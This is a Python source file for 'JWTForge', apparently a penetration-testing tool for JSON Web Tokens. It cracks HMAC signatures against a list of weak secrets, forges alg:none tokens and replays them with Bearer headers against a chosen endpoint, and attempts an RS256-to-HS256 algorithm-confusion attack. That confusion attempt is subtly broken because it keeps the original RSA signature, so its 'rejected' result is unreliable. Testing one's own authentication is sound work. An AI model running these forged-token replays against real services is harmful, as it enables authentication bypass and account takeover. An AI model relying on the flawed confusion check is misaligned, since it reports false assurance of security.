import sys
import os
import argparse
import base64
import json
import hmac
import hashlib
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool

__version__ = "1.0.0"

WEAK_SECRETS = [
    "secret", "password", "123456", "changeme", "supersecret",
    "jwt_secret", "mysecret", "token", "key", "admin",
]


def _b64_decode(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _decode_part(part):
    try:
        return json.loads(_b64_decode(part))
    except Exception:
        return {}


class JWTForge(VibeTool):
    def __init__(self):
        super().__init__("JWTForge", "JWT Security Analyzer")

    def _decode(self, token):
        parts = token.split(".")
        if len(parts) != 3:
            self.log("Token does not look like a JWT (need 3 parts)", "fail")
            return None, None, None
        header = _decode_part(parts[0])
        payload = _decode_part(parts[1])
        return header, payload, parts

    def _make_none_token(self, parts):
        header = _decode_part(parts[0])
        header["alg"] = "none"
        new_header = _b64_encode(json.dumps(header, separators=(",", ":")).encode())
        return f"{new_header}.{parts[1]}."

    def _replay(self, endpoint, token):
        status, body, _ = self.safe_request(
            endpoint, headers={"Authorization": f"Bearer {token}"}
        )
        return status, body

    def run(self, token, endpoint=None):
        self.banner()
        self.log(f"Analyzing token: {token[:30]}...")

        header, payload, parts = self._decode(token)
        if header is None:
            return

        # Report decoded contents
        self.log(f"Header:  {json.dumps(header)}", "info")
        self.log(f"Payload: {json.dumps(payload)}", "info")

        # Check expiry
        exp = payload.get("exp")
        if exp:
            remaining = exp - int(time.time())
            if remaining < 0:
                self.log(f"Token is EXPIRED ({abs(remaining)}s ago)", "warn")
            else:
                self.log(f"Token expires in {remaining}s", "info")
        else:
            self.log("No 'exp' claim — token never expires", "crit")

        # Check algorithm
        alg = header.get("alg", "").upper()
        self.log(f"Algorithm: {alg}", "info")
        if alg == "NONE":
            self.log("alg:none token — no signature verification!", "crit")
        elif alg in ("HS256", "HS384", "HS512"):
            self.log("Symmetric (HS*) algorithm — testing weak secrets...", "info")
            sig_input = f"{parts[0]}.{parts[1]}".encode()
            algo_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
            h = algo_map.get(alg, hashlib.sha256)
            for secret in WEAK_SECRETS:
                sig = hmac.new(secret.encode(), sig_input, h).digest()
                candidate = _b64_encode(sig)
                if candidate == parts[2]:
                    self.log(f"WEAK SECRET FOUND: '{secret}'", "crit")
                    break
            else:
                self.log("No common weak secrets matched", "pass")

        # alg:none bypass
        none_token = self._make_none_token(parts)
        self.log(f"alg:none token crafted: {none_token[:40]}...", "info")
        if endpoint:
            status, body = self._replay(endpoint, none_token)
            if status == 200:
                self.log(f"alg:none bypass ACCEPTED (200) by {endpoint}", "crit")
            elif status in (401, 403):
                self.log(f"alg:none bypass rejected ({status}) — server validates alg", "pass")
            else:
                self.log(f"alg:none replay returned {status}", "warn")

            # RS256→HS256 confusion attempt (reuse original token with alg swapped)
            if alg.startswith("RS"):
                confused_header = _decode_part(parts[0])
                confused_header["alg"] = "HS256"
                new_h = _b64_encode(json.dumps(confused_header, separators=(",", ":")).encode())
                confused_token = f"{new_h}.{parts[1]}.{parts[2]}"
                status2, _ = self._replay(endpoint, confused_token)
                if status2 == 200:
                    self.log("RS256→HS256 algorithm confusion ACCEPTED!", "crit")
                else:
                    self.log(f"RS256→HS256 confusion rejected ({status2})", "pass")
        else:
            self.log("No --endpoint provided — skipping replay tests", "info")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="JWTForge - JWT Security Analyzer")
    parser.add_argument("--token", required=True, help="JWT token to analyze")
    parser.add_argument("--endpoint", default=None, help="Endpoint URL to replay modified tokens against")
    parser.add_argument("-v", "--version", action="version", version=f"JWTForge {__version__}")
    args = parser.parse_args()
    JWTForge().run(args.token, args.endpoint)
